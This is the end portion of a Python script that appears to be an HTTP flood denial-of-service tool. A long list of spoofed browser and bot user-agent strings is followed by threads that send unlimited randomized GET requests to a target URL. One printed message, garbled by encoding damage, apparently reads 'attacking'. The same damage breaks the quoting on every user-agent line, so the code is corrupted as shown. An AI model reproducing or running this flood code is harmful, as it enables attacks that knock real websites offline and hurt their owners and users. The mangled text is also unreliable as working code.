    headers.append("Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre???)
    headers.append("Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0???)
    headers.append("Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1???)
    headers.append("Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1???)
    headers.append("Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2???)
    headers.append("Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0???)
    headers.append("Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0???)
    headers.append("Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0???)
    headers.append("Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0???)
    headers.append("Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0???)
    headers.append("Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2 (KHTML, like Gecko) Safari/531.2 Epiphany/2.30.0???)
    headers.append("Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8???)
    headers.append("Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0???)
    headers.append("Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15???)
    headers.append("Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.8) Gecko/20060202 Firefox/1.5???)
    headers.append("Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16???)
    headers.append("Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko???)
    headers.append("Mozilla/5.0 (X11; U; IRIX64 IP27; en-US; rv:1.4) Gecko/20030711???)
    headers.append("Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025???)
    headers.append("Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020???)
    headers.append("Mozilla/5.0 (X11; U; Linux armv7l like Android; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/533.2+ Kindle/3.0+???)
    headers.append("Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1???)
    headers.append("Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)???)
    headers.append("Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)???)
    headers.append("Mozilla/5.0 (X11; U; Linux i686; de-AT; rv:1.4.1)???)
    headers.append("Mozilla/5.0 (X11; U; Linux i686; de-AT; rv:1.7.12) Gecko/20051013 Debian/1.7.12-1ubuntu1???)
    headers.append("Mozilla/5.0 (X11; U; Linux i686; de-DE; rv:1.4) Gecko/20030624???)
    headers.append("Mozilla/5.0 (X11; U; Linux i686; de-DE; rv:1.7.12)???)
    headers.append("Mozilla/5.0 (X11; U; Linux i686; de-DE; rv:1.8b4)???)
    headers.append("Mozilla/5.0 (X11; U; Linux i686; de; rv:1.8)???)
    headers.append("Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5 (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher???)
    headers.append("Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian???)
    headers.append("Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8???)
    headers.append("Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15???)
    headers.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8???)
    headers.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051008 Firefox/1.0.7???)
    headers.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)???)
    headers.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20060205 Galeon/2.0.0 (Debian package 2.0.0-2)???)
    headers.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.1)???)
    headers.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)???)
    headers.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)???)
    headers.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)???)
    headers.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6???)
    headers.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)???)
    headers.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11???)
    headers.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2???)
    headers.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4???)
    headers.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0???)
    headers.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330???)
    headers.append("Mozilla/5.0 (X11; U; Linux i686; fr; rv:1.7.12)???)
    headers.append("Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)???)
    headers.append("Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8???)
    headers.append("Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0???)
    headers.append("Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)???)
    headers.append("Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8???)
    headers.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Comodo_Dragon/4.1.1.11 Chrome/4.1.249.1042 Safari/532.5???)
    headers.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9???)
    headers.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7???)
    headers.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15???)
    headers.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0???)
    headers.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)???)
    headers.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)???)
    headers.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3???)
    headers.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3???)
    headers.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5???)
    headers.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8???)
    headers.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12???)
    headers.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7???)
    headers.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8???)
    headers.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9???)
    headers.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13???)
    headers.append("Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12???)
    headers.append("Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0???)
    headers.append("Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527 (KHTML, like Gecko, Safari/419.3) Arora/0.10.1???)
    headers.append("Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7???)
    headers.append("Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.5???)
    headers.append("Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14???)
    headers.append("Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15???)
    headers.append("Mozilla/5.0 (X11; U; NetBSD i386; en-US; rv:1.8.0.1) Gecko/20060310 Firefox/1.5.0.1???)
    headers.append("Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2 (KHTML, like Gecko) Safari/531.2 Epiphany/2.30.0???)
    headers.append("Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3???)
    headers.append("Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5???)
    headers.append("Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8???)
    headers.append("Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3???)
    headers.append("Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6???)
    headers.append("Mozilla/5.0 (X11; U; SunOS sun4u; en-US; rv:1.7) Gecko/20051122???)
    headers.append("Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0???)
    headers.append("Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0???)
    headers.append("Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0???)
    headers.append("Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41???)
    headers.append("Mozilla/5.0(compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)???)
    headers.append("MSIE (MSIE 6.0; X11; Linux; i686) Opera 7.23???)
    headers.append("msnbot-media/1.1 ( http://search.msn.com/msnbot.htm)???)
    headers.append("msnbot/0.9 (+http://search.msn.com/msnbot.htm)???)
    headers.append("msnbot/0.11 ( http://search.msn.com/msnbot.htm)???)
    headers.append("msnbot/1.0 ( http://search.msn.com/msnbot.htm)???)
    headers.append("msnbot/1.0 (+http://search.msn.com/msnbot.htm)???)
    headers.append("msnbot/1.1 ( http://search.msn.com/msnbot.htm)???)
    headers.append("NetBSD-ftp/20031210???)
    headers.append("NetSurf/1.2 (NetBSD; amd64)???)
    headers.append("Nokia3230/2.0 (5.0614.0) SymbianOS/7.0s Series60/2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0???)
    headers.append("Nokia6100/1.0 (04.01) Profile/MIDP-1.0 Configuration/CLDC-1.0???)
    headers.append("Nokia6230/2.0 (04.44) Profile/MIDP-2.0 Configuration/CLDC-1.1???)
    headers.append("Nokia6230i/2.0 (03.80) Profile/MIDP-2.0 Configuration/CLDC-1.1???)
    headers.append("Nokia6630/1.0 (2.3.129) SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1???)
    headers.append("Nokia6630/1.0 (2.39.15) SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1???)
    headers.append("Nokia7250/1.0 (3.14) Profile/MIDP-1.0 Configuration/CLDC-1.0???)
    headers.append("NokiaN70-1/5.0609.2.0.1 Series60/2.8 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0???)
    headers.append("NokiaN73-1/3.0649.0.0.1 Series60/3.0 Profile/MIDP2.0 Configuration/CLDC-1.1???)
    headers.append("nook browser/1.0???)
    headers.append("NutchCVS/0.8-dev (Nutch running at UW; http://www.nutch.org/docs/en/bot.html; sycrawl@cs.washington.edu)???)
    headers.append("Offline Explorer/2.5???)
    headers.append("Opera/5.0 (SunOS 5.8 sun4m; U) [en]???)
    headers.append("Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)???)
    headers.append("Opera/7.50 (Windows ME; U) [en]???)
    headers.append("Opera/7.50 (Windows XP; U)???)
    headers.append("Opera/7.51 (Windows NT 5.1; U) [en]???)
    headers.append("Opera/8.01 (J2ME/MIDP; Opera Mini/1.0.1479/HiFi; SonyEricsson P900; no; U; ssr)???)
    headers.append("Opera/8.01 (Windows NT 5.0; U; de)???)
    headers.append("Opera/8.01 (Windows NT 5.1; U; de)???)
    headers.append("Opera/8.50 (Windows NT 5.1; U; de)???)
    headers.append("Opera/8.51 (Windows NT 5.1; U; en)???)
    headers.append("Opera/8.51 (Windows NT 5.1; U; en;VWP-online.de)???)
    headers.append("Opera/8.51 (X11; Linux i386; U; de)???)
    headers.append("Opera/8.52 (X11; Linux i386; U; de)???)
    headers.append("Opera/8.53 (Windows NT 5.0; U; en)???)
    headers.append("Opera/8.53 (Windows NT 5.1; U; en)???)
    headers.append("Opera/8.54 (Windows NT 5.1; U; de)???)
    headers.append("Opera/9.0 (Macintosh; PPC Mac OS X; U; en)???)
    headers.append("Opera/9.5 (Microsoft Windows; PPC; Opera Mobi; U) SonyEricssonX1i/R2AA Profile/MIDP-2.0 Configuration/CLDC-1.1???)
    headers.append("Opera/9.20 (Macintosh; Intel Mac OS X; U; en)???)
    headers.append("Opera/9.20 (Windows NT 6.0; U; en)???)
    headers.append("Opera/9.25 (Windows NT 6.0; U; en)???)
    headers.append("Opera/9.30 (Nintendo Wii; U; ; 2047-7; en)???)
    headers.append("Opera/9.51 Beta (Microsoft Windows; PPC; Opera Mobi/1718; U; en)???)
    headers.append("Opera/9.60 (J2ME/MIDP; Opera Mini/4.1.11320/608; U; en) Presto/2.2.0???)
    headers.append("Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14320/554; U; cs) Presto/2.2.0???)
    headers.append("Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15???)
    headers.append("Opera/9.64 (Macintosh; PPC Mac OS X; U; en) Presto/2.1.1???)
    headers.append("Opera/9.64 (X11; Linux i686; U; Linux Mint; nb) Presto/2.1.1???)
    headers.append("Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.16823/1428; U; en) Presto/2.2.0???)
    headers.append("Opera/9.80 (Linux armv7l) Presto/2.12.407 Version/12.51 , D50u-D1-UHD/V1.5.16-UHD (Vizio, D50u-D1, Wireless)???)
    headers.append("Opera/9.80 (Macintosh; Intel Mac OS X 10.4.11; U; en) Presto/2.7.62 Version/11.00???)
    headers.append("Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52???)
    headers.append("Opera/9.80 (Macintosh; Intel Mac OS X; U; en) Presto/2.6.30 Version/10.61???)
    headers.append("Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10???)
    headers.append("Opera/9.80 (S60; SymbOS; Opera Mobi/499; U; ru) Presto/2.4.18 Version/10.00???)
    headers.append("Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10???)
    headers.append("Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.7.39 Version/11.00???)
    headers.append("Opera/9.80 (Windows NT 5.1; U; zh-tw) Presto/2.8.131 Version/11.10???)
    headers.append("Opera/9.80 (Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10???)
    headers.append("Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51???)
    headers.append("Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14???)
    headers.append("Opera/9.80 (Windows NT 6.1; U; en) Presto/2.7.62 Version/11.01???)
    headers.append("Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00???)
    headers.append("Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.18???)
    headers.append("Opera/9.80 (Windows NT 6.2; Win64; x64) Presto/2.12.388 Version/12.16???)
    headers.append("Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.10???)
    headers.append("Opera/9.80 (X11; Linux x86_64; U; pl) Presto/2.7.62 Version/11.00???)
    headers.append("Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0???)
    headers.append("Opera/10.61 (J2ME/MIDP; Opera Mini/5.1.21219/19.999; en-US; rv:1.9.3a5) WebKit/534.5 Presto/2.6.30???)
    headers.append("P3P Validator???)
    headers.append("Peach/1.01 (Ubuntu 8.04 LTS; U; en)???)
    headers.append("POLARIS/6.01 (BREW 3.1.5; U; en-us; LG; LX265; POLARIS/6.01/WAP) MMP/2.0 profile/MIDP-2.1 Configuration/CLDC-1.1???)
    headers.append("POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /CLDC-1.1???)
    headers.append("portalmmm/2.0 N410i(c20;TB)???)
    headers.append("Python-urllib/2.5???)
    headers.append("Roku4640X/DVP-7.70 (297.70E04154A)???)
    headers.append("SAMSUNG-S8000/S8000XXIF3 SHP/VPP/R5 Jasmine/1.0 Nextreaming SMM-MMS/1.2.0 profile/MIDP-2.1 configuration/CLDC-1.1 FirePHP/0.3???)
    headers.append("SAMSUNG-SGH-A867/A867UCHJ3 SHP/VPP/R5 NetFront/35 SMM-MMS/1.2.0 profile/MIDP-2.0 configuration/CLDC-1.1 UP.Link/6.3.0.0.0???)
    headers.append("SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1; http://www.google.com/bot.html)???)
    headers.append("SearchExpress???)
    headers.append("SEC-SGHE900/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4509/1378; nl; U; ssr)???)
    headers.append("SEC-SGHX210/1.0 UP.Link/6.3.1.13.0???)
    headers.append("SEC-SGHX820/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1???)
    headers.append("SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)???)
    headers.append("SonyEricssonK310iv/R4DA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0???)
    headers.append("SonyEricssonK550i/R1JD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1???)
    headers.append("SonyEricssonK610i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1???)
    headers.append("SonyEricssonK750i/R1CA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1???)
    headers.append("SonyEricssonK800i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0???)
    headers.append("SonyEricssonK810i/R1KG Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1???)
    headers.append("SonyEricssonS500i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1???)
    headers.append("SonyEricssonT68/R201A???)
    headers.append("SonyEricssonT100/R101???)
    headers.append("SonyEricssonT610/R201 Profile/MIDP-1.0 Configuration/CLDC-1.0???)
    headers.append("SonyEricssonT650i/R7AA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1???)
    headers.append("SonyEricssonW580i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1???)
    headers.append("SonyEricssonW660i/R6AD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1???)
    headers.append("SonyEricssonW810i/R4EA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0???)
    headers.append("SonyEricssonW850i/R1ED Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1???)
    headers.append("SonyEricssonW950i/R100 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 323) Opera 8.60 [en-US]???)
    headers.append("SonyEricssonW995/R1EA Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0???)
    headers.append("SonyEricssonZ800/R1Y Browser/SEMC-Browser/4.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0???)
    headers.append("sproose/0.1-alpha (sproose crawler; http://www.sproose.com/bot.html; crawler@sproose.com)???)
    headers.append("Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)???)
    headers.append("SuperBot/4.4.0.60 (Windows XP)???)
    headers.append("tnftp/20050625???)
    headers.append("Uzbl (Webkit 1.3) (Linux i686 [i686])???)
    headers.append("Vodafone/1.0/V802SE/SEJ001 Browser/SEMC-Browser/4.1???)
    headers.append("W3C_Validator/1.305.2.12 libwww-perl/5.64???)
    headers.append("W3C_Validator/1.654???)
    headers.append("w3m/0.5.1???)
    headers.append("WDG_Validator/1.6.2???)
    headers.append("Web Downloader/6.9???)
    headers.append("WebCopier v4.6???)
    headers.append("WebZIP/3.5 (http://www.spidersoft.com)???)
    headers.append("Wget/1.7???)
    headers.append("Wget/1.8.1???)
    headers.append("Wget/1.8.2???)
    headers.append("Wget/1.9 cvs-stable (Red Hat modified)???)
    headers.append("Wget/1.9.1???)
    headers.append("Wget/1.10.1???)
    headers.append("wii libnup/1.0???)
    headers.append("YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)???)
    return headers


def genstr(size):
    out_str = ''

    for _ in range(0, size):
        code = random.randint(65, 90)
        out_str += chr(code)
    
    return out_str


class httpth1(threading.Thread):
    def run(self):
        global count
        while True:
            try:
                headers={'User-Agent' : random.choice(useragent()), 'Referer' : random.choice(referer)}
                randomized_url = url + "?" + genstr(random.randint(3, 10))
                requests.get(randomized_url, headers=headers)
                count += 1
                print ("{0} Website Error...".format(count))
            except requests.exceptions.ConnectionError:
                print ("??ang T???n C??ng...")
                pass
            except requests.exceptions.InvalidSchema:
                print ("[URL Error]")
                raise SystemExit()
            except ValueError:
                print ("[Check Your URL]")
                raise SystemExit()
            except KeyboardInterrupt:
                print("[Canceled by User]")
                raise SystemExit()


while True:
    try:
        th1 = httpth1()
        th1.start()
    except Exception:
        pass
    except KeyboardInterrupt:
        exit("[Canceled By User]")
        raise SystemExit()
